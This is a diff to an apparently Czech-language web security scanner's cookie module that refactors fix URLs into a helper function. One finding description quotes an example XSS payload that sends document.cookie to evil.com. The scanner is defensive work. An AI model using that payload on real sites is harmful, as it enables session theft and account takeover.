@@ -1,4 +1,4 @@
-from .base import BaseScanModule, Finding, Severity
+from .base import BaseScanModule, Finding, Severity, guide_url
 
 
 def _parse_cookie_name(set_cookie: str) -> str:
@@ -77,7 +77,7 @@ class CookieScanner(BaseScanModule):
                 description="Cookies bez Secure flagu se odesílají i přes nezabezpečené HTTP spojení. Útočník na veřejné Wi-Fi může zachytit session cookie a převzít účet uživatele.",
                 severity=Severity.WARNING,
                 category="cookies",
-                fix_url="/guide/#autentizace-sessions",
+                fix_url=guide_url("autentizace-sessions"),
                 doc_url="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#security",
                 detail=_format_cookie_names(missing_secure),
             ))
@@ -89,7 +89,7 @@ class CookieScanner(BaseScanModule):
                 description="Cookies bez HttpOnly jsou čitelné přes document.cookie v JavaScriptu. Při XSS útoku stačí jeden řádek kódu: document.location='https://evil.com/?c='+document.cookie",
                 severity=Severity.WARNING,
                 category="cookies",
-                fix_url="/guide/#autentizace-sessions",
+                fix_url=guide_url("autentizace-sessions"),
                 doc_url="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#security",
                 detail=_format_cookie_names(missing_httponly),
             ))
@@ -101,7 +101,7 @@ class CookieScanner(BaseScanModule):
                 description="Cookies bez SameSite se odesílají i z cizích stránek. Útočník vytvoří formulář na svém webu, který odešle POST na váš server — prohlížeč přiloží cookies a akce proběhne za přihlášeného uživatele (CSRF).",
                 severity=Severity.WARNING,
                 category="cookies",
-                fix_url="/guide/#autentizace-sessions",
+                fix_url=guide_url("autentizace-sessions"),
                 doc_url="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#samesite_attribute",
                 detail=_format_cookie_names(missing_samesite),
             ))
